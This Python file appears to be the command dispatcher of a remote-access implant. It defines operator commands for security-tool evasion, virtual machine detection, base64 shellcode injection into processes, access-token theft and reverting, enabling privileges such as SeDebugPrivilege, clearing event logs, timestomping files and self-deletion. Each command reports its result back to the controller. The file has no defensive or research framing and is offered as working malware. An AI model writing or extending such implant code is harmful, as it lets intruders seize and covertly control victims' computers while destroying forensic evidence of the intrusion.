from client.commands.base import Command


class EvasionCommand(Command):
    name = 'evasion'

    def execute(self, ctx, raw: str):
        from client.modules.stealth import apply_all_bypasses
        result = apply_all_bypasses()
        ctx.protocol.send(result)
        return True


class DetectVMCommand(Command):
    name = 'detect_vm'

    def execute(self, ctx, raw: str):
        from client.modules.stealth import detect_vm
        ctx.protocol.send(detect_vm())
        return True


class InjectCommand(Command):
    name = 'inject'

    def execute(self, ctx, raw: str):
        args = raw[7:].strip().split(None, 2)
        if not args:
            ctx.protocol.send('[-] Usage: inject <pid|process_name> [shellcode_b64]')
            return True
        from client.modules.stealth import inject_shellcode, inject_into_process, find_process
        import base64
        target = args[0]
        try:
            pid = int(target)
            if len(args) >= 2:
                sc = base64.b64decode(args[1])
                ctx.protocol.send(inject_shellcode(pid, sc))
            else:
                ctx.protocol.send(find_process(target))
        except ValueError:
            if len(args) >= 2:
                sc = base64.b64decode(args[1])
                ctx.protocol.send(inject_into_process(target, sc))
            else:
                ctx.protocol.send(find_process(target))
        return True


class StealTokenCommand(Command):
    name = 'steal_token'

    def execute(self, ctx, raw: str):
        pid = raw[12:].strip()
        if not pid:
            ctx.protocol.send('[-] Usage: steal_token <pid>')
            return True
        from client.modules.stealth import steal_token_cmd
        ctx.protocol.send(steal_token_cmd(pid))
        return True


class RevertTokenCommand(Command):
    name = 'rev2self'

    def execute(self, ctx, raw: str):
        from client.modules.stealth import revert_token_cmd
        ctx.protocol.send(revert_token_cmd())
        return True


class WhoamiCommand(Command):
    name = 'whoami'

    def execute(self, ctx, raw: str):
        from client.modules.stealth import whoami_cmd
        ctx.protocol.send(whoami_cmd())
        return True


class EnablePrivilegeCommand(Command):
    name = 'priv_enable'

    def execute(self, ctx, raw: str):
        priv = raw[12:].strip()
        if not priv:
            ctx.protocol.send('[-] Usage: priv_enable <SeDebugPrivilege|SeImpersonatePrivilege|...>')
            return True
        from client.modules.stealth import enable_privilege_cmd
        ctx.protocol.send(enable_privilege_cmd(priv))
        return True


class ClearLogsCommand(Command):
    name = 'clear_logs'

    def execute(self, ctx, raw: str):
        from client.modules.stealth import clear_logs
        ctx.protocol.send(clear_logs())
        return True


class TimestompCommand(Command):
    name = 'timestomp'

    def execute(self, ctx, raw: str):
        path = raw[10:].strip()
        if not path:
            ctx.protocol.send('[-] Usage: timestomp <path> [reference_date]')
            return True
        from client.modules.stealth import timestomp
        ctx.protocol.send(timestomp(path))
        return True


class SelfDeleteCommand(Command):
    name = 'self_delete'

    def execute(self, ctx, raw: str):
        from client.modules.stealth import self_delete
        ctx.protocol.send(self_delete())
        return True
